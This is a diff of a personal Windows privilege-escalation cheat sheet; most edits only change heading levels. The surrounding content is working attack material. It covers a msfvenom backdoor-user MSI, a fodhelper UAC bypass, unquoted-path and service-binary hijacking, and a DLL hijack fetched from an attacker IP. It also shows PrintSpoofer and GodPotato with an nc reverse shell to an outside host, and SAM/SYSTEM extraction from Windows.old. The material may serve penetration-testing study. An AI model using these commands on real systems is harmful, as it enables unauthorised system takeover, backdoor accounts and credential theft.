@@ -4,48 +4,48 @@
 
 >"BUILTIN\Users," on the other hand, includes only the user accounts that have been created on the local system. This group typically doesn't include unauthenticated users and doesn't include accounts from trusted domains or external sources.
 ### Windows
-###### AutoEnumeration
+##### AutoEnumeration
 winpeas.exe
-###### find service with filename
+##### find service with filename
 ```
 wmic service get name,pathname |  findstr /i "backup.exe"
 ```
-###### Check which user runns this service
+##### Check which user runns this service
 ```
 Get-Service -Name "RasMan" | Select-Object Name, Status, DisplayName, UserName
 sc qc <service_name>
 ```
-###### Check which exe file using specific dll
+##### Check which exe file using specific dll
 ```
 tasklist /m dllname
 tasklist /m (list all process using which dlls)
 ```
 
-###### list relationship between Processes and Services (Windows can't list processes run by privileged users)
+##### list relationship between Processes and Services (Windows can't list processes run by privileged users)
 ```
 tasklist /svc
 tasklist /svc /fi "imagename eq your_file.exe"
 ```
-###### Service Actions
+##### Service Actions
 ```
 Start-Service -Name ""
 Stop-Service -Name ""
 sc stop servicename
 ```
 
-###### Powershell history
+##### Powershell history
 ```
 (Get-PSReadlineOption).HistorySavePath
 ```
 
-###### Firewall
+##### Firewall
 ```
 netsh advfirewall show currentprofile  
 netsh advfirewall show allprofile  
 netsh advfirewall firewall show rule name=all
 ```
 
-###### Scheduled Tasks
+##### Scheduled Tasks
 ```
 schtasks /query /fo LIST /v
 schtasks /query /v /fo list | findstr /i "backup.exe"
@@ -53,18 +53,18 @@ schtasks /query /fo LIST /v /tn "backup runner(taskname)" ----for retrieve full 
 Get-ScheduledTask | Where-Object {$_.TaskName -like '*backup*'}
 ```
 
-###### Enumerating Unmounted Disks
+##### Enumerating Unmounted Disks
 ```
 mountvol
 ```
 
-###### Enumerating Device Drivers and Kernel Modules
+##### Enumerating Device Drivers and Kernel Modules
 ```
 1. driverquery /v /FO Table  
 2. Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer
 ```
 
-###### Enumerating Binaries That AutoElevate
+##### Enumerating Binaries That AutoElevate
 ```
 reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer  
 reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
@@ -73,7 +73,7 @@ $ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi-nouac -o evi
 $ msiexec /quiet /qn /i C:\evil.msi
 ```
 
-###### Bypass UAC
+##### Bypass UAC
 ```
 1. check C:\Windows\System32\fodhelper.exe
 2. REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command
@@ -89,7 +89,7 @@ set target 1(x64,0=x86)
 Note to set payload the same arch with session 1's payload，set lhost and lport same with session 1
 ```
 
-###### Insecure File Permissions
+##### Insecure File Permissions
 ```
 1. Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'} # look for services with path in Program Files
 2. icacls "service path" # check if current user has permission to replace file with malicious one
@@ -98,7 +98,7 @@ Note to set payload the same arch with session 1's payload，set lhost and lport
 5. whoami /priv #check out shutdown privileges of user
 ```
 
-###### Unquoted Service Paths
+##### Unquoted Service Paths
 To list all unquoted service paths (minus built-in Windows services)
 ```
 wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
@@ -120,14 +120,15 @@ C:\Program Files\My Program\My service\service.exe
 3. restart the service to receive rev shell or msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
 ```
 
-Automatic Script:
 ```
+Automatic Script:
+
 cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
 Import-Module .\PowerUp.ps1
 Get-UnquotedService
 ```
 
-###### Service Binary Hijacking
+##### Service Binary Hijacking
 ```
 Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
 
@@ -159,7 +160,7 @@ Import-Module .\PowerUp.ps1
 Get-ModifiableServiceFile
 ```
 
-###### Service DLL Hijacking
+##### Service DLL Hijacking
 standard search order taken from the Microsoft Documentation
 When safe DLL search mode is disabled, the current directory is searched at position 2 after the application's directory
 ```
@@ -184,6 +185,7 @@ This function generally contains four cases named DLL_PROCESS_ATTACH, DLL_THREAD
 ```
 #include <stdlib.h>
 #include <windows.h> //appened code
+//name:myDLL.cpp
 
 BOOL APIENTRY DllMain(
 HANDLE hModule,// Handle to DLL module
@@ -206,20 +208,16 @@ LPVOID lpReserved ) // Reserved
     }
     return TRUE;
 }
-```
 
-Cross-compile
-```
+Cross-compile:
 x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
-```
 
-Replace and restart service
-```
+Replace and restart service:
 iwr -uri http://192.168.119.3/myDLL.dll -Outfile myDLL.dll
 Restart-Service BetaService
 ```
 
-###### Scheduled Tasks
+##### Scheduled Tasks
 ```
 Get-ScheduledTask
 schtasks /query /fo LIST /v
@@ -229,7 +227,7 @@ move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak
 move .\BackendCacheCleanup.exe .\Pictures\
 ```
 
-###### Named Pipes(PrintSpoofer)
+##### Named Pipes(PrintSpoofer)
 ```
 Requirements: SeImpersonatePrivilege has to be enabled
 Download address: wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
@@ -238,7 +236,7 @@ victim: .\PrintSpoofer64.exe -i -c powershell.exe(cmd.exe)\
 
 whoami
 ```
-###### Godpotato
+##### Godpotato
 ```
 GodPotato-NET4.exe
 GodPotato -cmd "cmd /c whoami"
@@ -247,7 +245,7 @@ GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
 Affected version:
 Windows Server 2012 - Windows Server 2022 Windows8 - Windows 11
 ```
-###### PowerUp.ps1
+##### PowerUp.ps1
 ```
 Service Enumeration:
 Get-ServiceUnquoted                 -   returns services with unquoted paths that also have a space in the name
@@ -283,7 +281,7 @@ Test-ServiceDaclPermission          -   tests one or more passed services or ser
 Write-UserAddMSI                    -   write out a MSI installer that prompts for a user to be added
 Invoke-AllChecks                    -   runs all current escalation checks and returns a report
 ```
-###### Windows.old
+##### Windows.old
 >Essentially, the Windows.old folder just contains the old Windows system. From the Windows system files to your installed programs and each user account’s settings and files, it’s all here. The new version of Windows just keeps it around in case you’d like to go back to that older version of Windows or in case you need to dig in and find a file.
 ```
 1. Find SAM and SYSTEM file under Windows.old\Windows\System32\
